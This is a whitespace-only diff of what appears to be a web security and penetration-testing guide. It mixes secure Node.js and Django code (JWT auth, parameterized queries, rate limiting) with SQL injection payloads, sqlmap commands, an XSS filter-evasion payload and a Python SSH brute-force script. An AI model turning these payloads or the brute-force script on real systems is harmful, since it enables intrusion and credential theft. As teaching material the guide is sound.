@@ -126,60 +126,60 @@ const bcrypt = require('bcrypt');
 app.post('/api/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body;
-
+    
     // Validate input
     if (!email || !password) {
-      return res.status(400).json({
-        error: 'Email and password are required'
+      return res.status(400).json({ 
+        error: 'Email and password are required' 
       });
     }
-
+    
     // Find user
-    const user = await db.user.findUnique({
-      where: { email }
+    const user = await db.user.findUnique({ 
+      where: { email } 
     });
-
+    
     if (!user) {
       // Don't reveal if user exists
-      return res.status(401).json({
-        error: 'Invalid credentials'
+      return res.status(401).json({ 
+        error: 'Invalid credentials' 
       });
     }
-
+    
     // Verify password
     const validPassword = await bcrypt.compare(
-      password,
+      password, 
       user.passwordHash
     );
-
+    
     if (!validPassword) {
-      return res.status(401).json({
-        error: 'Invalid credentials'
+      return res.status(401).json({ 
+        error: 'Invalid credentials' 
       });
     }
-
+    
     // Generate JWT token
     const token = jwt.sign(
-      {
+      { 
         userId: user.id,
         email: user.email,
         role: user.role
       },
       process.env.JWT_SECRET,
-      {
+      { 
         expiresIn: '1h',
         issuer: 'your-app',
         audience: 'your-app-users'
       }
     );
-
+    
     // Generate refresh token
     const refreshToken = jwt.sign(
       { userId: user.id },
       process.env.JWT_REFRESH_SECRET,
       { expiresIn: '7d' }
     );
-
+    
     // Store refresh token in database
     await db.refreshToken.create({
       data: {
@@ -188,17 +188,17 @@ app.post('/api/auth/login', async (req, res) => {
         expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
       }
     });
-
+    
     res.json({
       token,
       refreshToken,
       expiresIn: 3600
     });
-
+    
   } catch (error) {
     console.error('Login error:', error);
-    res.status(500).json({
-      error: 'An error occurred during login'
+    res.status(500).json({ 
+      error: 'An error occurred during login' 
     });
   }
 });
@@ -214,33 +214,33 @@ function authenticateToken(req, res, next) {
   // Get token from header
   const authHeader = req.headers['authorization'];
   const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
-
+  
   if (!token) {
-    return res.status(401).json({
-      error: 'Access token required'
+    return res.status(401).json({ 
+      error: 'Access token required' 
     });
   }
-
+  
   // Verify token
   jwt.verify(
-    token,
+    token, 
     process.env.JWT_SECRET,
-    {
+    { 
       issuer: 'your-app',
       audience: 'your-app-users'
     },
     (err, user) => {
       if (err) {
         if (err.name === 'TokenExpiredError') {
-          return res.status(401).json({
-            error: 'Token expired'
+          return res.status(401).json({ 
+            error: 'Token expired' 
           });
         }
-        return res.status(403).json({
-          error: 'Invalid token'
+        return res.status(403).json({ 
+          error: 'Invalid token' 
         });
       }
-
+      
       // Attach user to request
       req.user = user;
       next();
@@ -268,7 +268,7 @@ app.get('/api/user/profile', authenticateToken, async (req, res) => {
         // Don't return passwordHash
       }
     });
-
+    
     res.json(user);
   } catch (error) {
     res.status(500).json({ error: 'Server error' });
@@ -281,20 +281,20 @@ app.get('/api/user/profile', authenticateToken, async (req, res) => {
 \`\`\`javascript
 app.post('/api/auth/refresh', async (req, res) => {
   const { refreshToken } = req.body;
-
+  
   if (!refreshToken) {
-    return res.status(401).json({
-      error: 'Refresh token required'
+    return res.status(401).json({ 
+      error: 'Refresh token required' 
     });
   }
-
+  
   try {
     // Verify refresh token
     const decoded = jwt.verify(
-      refreshToken,
+      refreshToken, 
       process.env.JWT_REFRESH_SECRET
     );
-
+    
     // Check if refresh token exists in database
     const storedToken = await db.refreshToken.findFirst({
       where: {
@@ -303,20 +303,20 @@ app.post('/api/auth/refresh', async (req, res) => {
         expiresAt: { gt: new Date() }
       }
     });
-
+    
     if (!storedToken) {
-      return res.status(403).json({
-        error: 'Invalid refresh token'
+      return res.status(403).json({ 
+        error: 'Invalid refresh token' 
       });
     }
-
+    
     // Generate new access token
     const user = await db.user.findUnique({
       where: { id: decoded.userId }
     });
-
+    
     const newToken = jwt.sign(
-      {
+      { 
         userId: user.id,
         email: user.email,
         role: user.role
@@ -324,15 +324,15 @@ app.post('/api/auth/refresh', async (req, res) => {
       process.env.JWT_SECRET,
       { expiresIn: '1h' }
     );
-
+    
     res.json({
       token: newToken,
       expiresIn: 3600
     });
-
+    
   } catch (error) {
-    res.status(403).json({
-      error: 'Invalid refresh token'
+    res.status(403).json({ 
+      error: 'Invalid refresh token' 
     });
   }
 });
@@ -363,11 +363,11 @@ app.post('/api/auth/refresh', async (req, res) => {
 // NEVER DO THIS - SQL Injection vulnerability
 app.get('/api/users/:id', async (req, res) => {
   const userId = req.params.id;
-
+  
   // Dangerous: User input directly in query
   const query = \`SELECT * FROM users WHERE id = '\${userId}'\`;
   const user = await db.query(query);
-
+  
   res.json(user);
 });
 
@@ -384,26 +384,26 @@ app.get('/api/users/:id', async (req, res) => {
 // ✅ Safe: Parameterized query
 app.get('/api/users/:id', async (req, res) => {
   const userId = req.params.id;
-
+  
   // Validate input first
   if (!userId || !/^\d+$/.test(userId)) {
-    return res.status(400).json({
-      error: 'Invalid user ID'
+    return res.status(400).json({ 
+      error: 'Invalid user ID' 
     });
   }
-
+  
   // Use parameterized query
   const user = await db.query(
     'SELECT id, email, name FROM users WHERE id = $1',
     [userId]
   );
-
+  
   if (!user) {
-    return res.status(404).json({
-      error: 'User not found'
+    return res.status(404).json({ 
+      error: 'User not found' 
     });
   }
-
+  
   res.json(user);
 });
 \`\`\`
@@ -414,13 +414,13 @@ app.get('/api/users/:id', async (req, res) => {
 // ✅ Safe: Using Prisma ORM
 app.get('/api/users/:id', async (req, res) => {
   const userId = parseInt(req.params.id);
-
+  
   if (isNaN(userId)) {
-    return res.status(400).json({
-      error: 'Invalid user ID'
+    return res.status(400).json({ 
+      error: 'Invalid user ID' 
     });
   }
-
+  
   const user = await prisma.user.findUnique({
     where: { id: userId },
     select: {
@@ -430,13 +430,13 @@ app.get('/api/users/:id', async (req, res) => {
       // Don't select sensitive fields
     }
   });
-
+  
   if (!user) {
-    return res.status(404).json({
-      error: 'User not found'
+    return res.status(404).json({ 
+      error: 'User not found' 
     });
   }
-
+  
   res.json(user);
 });
 \`\`\`
@@ -480,15 +480,15 @@ function validateRequest(schema) {
 }
 
 // Use validation
-app.post('/api/users',
+app.post('/api/users', 
   validateRequest(createUserSchema),
   async (req, res) => {
     // Input is validated at this point
     const { email, password, name, age } = req.body;
-
+    
     // Hash password
     const passwordHash = await bcrypt.hash(password, 10);
-
+    
     // Create user
     const user = await prisma.user.create({
       data: {
@@ -498,7 +498,7 @@ app.post('/api/users',
         age
       }
     });
-
+    
     // Don't return password hash
     const { passwordHash: _, ...userWithoutPassword } = user;
     res.status(201).json(userWithoutPassword);
@@ -513,27 +513,27 @@ const DOMPurify = require('isomorphic-dompurify');
 
 app.post('/api/comments', authenticateToken, async (req, res) => {
   const { content } = req.body;
-
+  
   // Validate
   if (!content || content.length > 1000) {
-    return res.status(400).json({
-      error: 'Invalid comment content'
+    return res.status(400).json({ 
+      error: 'Invalid comment content' 
     });
   }
-
+  
   // Sanitize HTML to prevent XSS
   const sanitizedContent = DOMPurify.sanitize(content, {
     ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
     ALLOWED_ATTR: ['href']
   });
-
+  
   const comment = await prisma.comment.create({
     data: {
       content: sanitizedContent,
       userId: req.user.userId
     }
   });
-
+  
   res.status(201).json(comment);
 });
 \`\`\`
@@ -626,7 +626,7 @@ const expensiveLimiter = rateLimit({
   }
 });
 
-app.post('/api/reports/generate',
+app.post('/api/reports/generate', 
   authenticateToken,
   expensiveLimiter,
   async (req, res) => {
@@ -645,19 +645,19 @@ function createTieredRateLimiter() {
     pro: { windowMs: 60 * 60 * 1000, max: 1000 },
     enterprise: { windowMs: 60 * 60 * 1000, max: 10000 }
   };
-
+  
   return async (req, res, next) => {
     const user = req.user;
     const tier = user?.tier || 'free';
     const limit = limits[tier];
-
+    
     const key = \`rl:user:\${user.userId}\`;
     const current = await redis.incr(key);
-
+    
     if (current === 1) {
       await redis.expire(key, limit.windowMs / 1000);
     }
-
+    
     if (current > limit.max) {
       return res.status(429).json({
         error: 'Rate limit exceeded',
@@ -666,14 +666,14 @@ function createTieredRateLimiter() {
         reset: await redis.ttl(key)
       });
     }
-
+    
     // Set rate limit headers
     res.set({
       'X-RateLimit-Limit': limit.max,
       'X-RateLimit-Remaining': limit.max - current,
       'X-RateLimit-Reset': await redis.ttl(key)
     });
-
+    
     next();
   };
 }
@@ -807,18 +807,18 @@ app.delete('/api/posts/:id', authenticateToken, async (req, res) => {
   const post = await prisma.post.findUnique({
     where: { id: req.params.id }
   });
-
+  
   if (!post) {
     return res.status(404).json({ error: 'Post not found' });
   }
-
+  
   // Check if user owns the post or is admin
   if (post.userId !== req.user.userId && req.user.role !== 'admin') {
-    return res.status(403).json({
-      error: 'Not authorized to delete this post'
+    return res.status(403).json({ 
+      error: 'Not authorized to delete this post' 
     });
   }
-
+  
   await prisma.post.delete({ where: { id: req.params.id } });
   res.json({ success: true });
 });
@@ -846,15 +846,15 @@ app.post('/api/users', async (req, res) => {
     res.json(user);
   } catch (error) {
     console.error('User creation error:', error); // Log full error
-
+    
     if (error.code === 'P2002') {
-      return res.status(400).json({
-        error: 'Email already exists'
+      return res.status(400).json({ 
+        error: 'Email already exists' 
       });
     }
-
-    res.status(500).json({
-      error: 'An error occurred while creating user'
+    
+    res.status(500).json({ 
+      error: 'An error occurred while creating user' 
     });
   }
 });
@@ -1111,7 +1111,7 @@ Original Request:
 GET /product?productId=1 HTTP/1.1
 
 Test 1: productId=2    → Valid product response
-Test 2: productId=999  → Not Found response
+Test 2: productId=999  → Not Found response  
 Test 3: productId='    → Error/exception response
 Test 4: productId=1 OR 1=1 → SQL injection test
 ```
@@ -2729,7 +2729,7 @@ def safe_file_access(base_dir, filename):
     # Resolve to absolute path
     base = os.path.realpath(base_dir)
     file_path = os.path.realpath(os.path.join(base, filename))
-
+    
     # Verify file is within base directory
     if file_path.startswith(base):
         return open(file_path, 'r').read()
@@ -3209,11 +3209,11 @@ Cookie: session=regular_user_session
 # Django example - validate ownership
 def update_address(request, address_id):
     address = Address.objects.get(id=address_id)
-
+    
     # Verify ownership before allowing update
     if address.user != request.user:
         return HttpResponseForbidden("Unauthorized")
-
+    
     # Proceed with update
     address.update(request.data)
 ```
@@ -3237,10 +3237,10 @@ def download_receipt(request, receipt_id):
         id=receipt_id,
         user=request.user  # Critical: filter by current user
     ).first()
-
+    
     if not receipt:
         return HttpResponseNotFound()
-
+    
     return FileResponse(receipt.file)
 ```
 
@@ -5658,7 +5658,7 @@ page.asp?id=1 or 1=1
 page.asp?id=1' or 1=1--
 page.asp?id=1" or 1=1--
 
--- False condition tests
+-- False condition tests  
 page.asp?id=1 and 1=2
 page.asp?id=1' and 1=2--
 ```
@@ -5916,7 +5916,7 @@ GET /product.php?id=5 HTTP/1.1
 **Detection Test**:
 ```
 GET /product.php?id=5' HTTP/1.1
-Response: MySQL error - syntax error near '''
+Response: MySQL error - syntax error near ''' 
 ```
 
 **Column Enumeration**:
@@ -5939,7 +5939,7 @@ Response: Displays admin credentials
 
 **Confirm Vulnerability**:
 ```sql
-id=5' AND SLEEP(5)--
+id=5' AND SLEEP(5)-- 
 -- Response delayed by 5 seconds (vulnerable confirmed)
 ```
 
@@ -6265,7 +6265,7 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -
 # POST /login.php HTTP/1.1
 # Host: target.com
 # Content-Type: application/x-www-form-urlencoded
-#
+# 
 # username=admin&password=test
 
 # Run SQLMap with request file
@@ -6762,7 +6762,7 @@ def ssh_connect(host, username, password):
     """Attempt SSH connection with credentials"""
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+    
     try:
         client.connect(host, username=username, password=password, timeout=5)
         print(f"[+] Success: {username}:{password}")
@@ -6785,7 +6785,7 @@ def ssh_brute_force(host, username, wordlist):
     """Brute-force SSH with wordlist"""
     with open(wordlist, 'r') as f:
         passwords = f.read().splitlines()
-
+    
     for password in passwords:
         client = ssh_connect(host, username, password.strip())
         if client:
@@ -6800,7 +6800,7 @@ def ssh_brute_force(host, username, wordlist):
 if __name__ == "__main__":
     target = "192.168.1.100"
     user = "admin"
-
+    
     # Single credential test
     client = ssh_connect(target, user, "password123")
     if client:
@@ -7303,7 +7303,7 @@ http || https
 # Email
 smtp || pop || imap
 
-# File sharing
+# File sharing  
 smb || smb2 || ftp
 
 # Authentication
@@ -8252,7 +8252,7 @@ Fake login form or misleading content here
 
 ```html
 <!-- Tab/newline insertion -->
-<img src=x    onerror
+<img src=x	onerror
 =alert(1)>
 
 <!-- JavaScript comments -->
